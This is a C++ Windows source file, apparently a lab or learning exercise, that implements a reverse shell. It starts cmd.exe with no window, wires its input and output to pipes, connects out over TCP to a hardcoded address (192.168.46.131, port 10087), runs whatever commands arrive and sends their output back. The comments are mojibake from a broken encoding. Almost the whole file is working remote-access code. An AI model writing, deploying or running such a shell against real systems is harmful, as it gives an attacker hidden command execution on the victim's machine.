
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
using namespace std;
HANDLE hMyWrite, hMyRead, hCmdWrite, hCmdRead;


WORD	wVersionRequested;
WSADATA	wsaData;
SOCKET	hSocketWait;		//ר�����ڵȴ����ӵ�socket

BOOL _InitCmd();
BOOL _InitClient();
int main(int argc, char* argv[])
{
	_InitCmd();
	_InitClient();



	DWORD	dwSize;
	char	szBuffer[256] = { 0 };
	char	szBuffer1[0x256] = { 0 };
	char	szBuffer2[0x1000] = { 0 };
	
	





	//2. �������ӷ�����
	sockaddr_in	addr;		//��������ip�Ͷ˿ڵĽṹ��
	addr.sin_family = AF_INET;				//INETЭ���
	addr.sin_addr.S_un.S_addr = inet_addr("192.168.46.131");	//ip��ַ
	addr.sin_port = htons(10087);			//�˿ڣ���Ҫ�����ֽ���ת�����ֽ���

	connect(hSocketWait, (sockaddr*)&addr, sizeof(sockaddr_in));				//�������ӷ����





	//3.send/recv
	while (TRUE)
	{
		recv(hSocketWait, szBuffer, sizeof(szBuffer), 0);							//�������Է���˵���Ϣ
		lstrcat(szBuffer, TEXT("\r\n"));

		WriteFile(hMyWrite, szBuffer, lstrlen(szBuffer), NULL, NULL);				//��ܵ���д������
		Sleep(100);
		int i = 0;
		while (1)
		{
			memset(szBuffer1, 0, sizeof(szBuffer1));
			ReadFile(hMyRead, szBuffer1, 256, &dwSize, NULL);						//�ӹܵ��ж�ȡ����
			lstrcat(szBuffer2, szBuffer1);
			if (dwSize != 256)
				break;
			i++;
		}

		send(hSocketWait, szBuffer2, sizeof(szBuffer2), 0);							//�����ݷ��ͻط����

	}



	//4.closesocket�ر�
	closesocket(hSocketWait);




	//��������
	WSACleanup();



	return 0;
}


//��ʼ��cmd�������ܵ��ͽ���
BOOL _InitCmd()
{

	SECURITY_ATTRIBUTES	as;
	as.nLength				= sizeof(SECURITY_ATTRIBUTES);
	as.bInheritHandle		= TRUE;							//�ܵ�����ɼ̳�
	as.lpSecurityDescriptor = NULL;
	CreatePipe(&hCmdRead, &hMyWrite, &as, 0);			// my ----> cmd  �ܵ�
	CreatePipe(&hMyRead, &hCmdWrite, &as, 0);			// my <---- cmd	 �ܵ�


	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;					//��˼�ǿ��Ը���cmd�ı�׼�������
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
		NULL,
		NULL,
		NULL,
		TRUE,	//�̳�
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	return 1;
}




//��ʼ���ͻ���

BOOL _InitClient()
{
	//windows�����⣬��Ҫ��������api����������ĳ�ʼ�����������


	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	//1.�����׽���
	
	hSocketWait = socket(
		AF_INET,	//INETЭ���
		SOCK_STREAM,//��ʾʹ�õ���TCPЭ��
		0);
	return 1;
}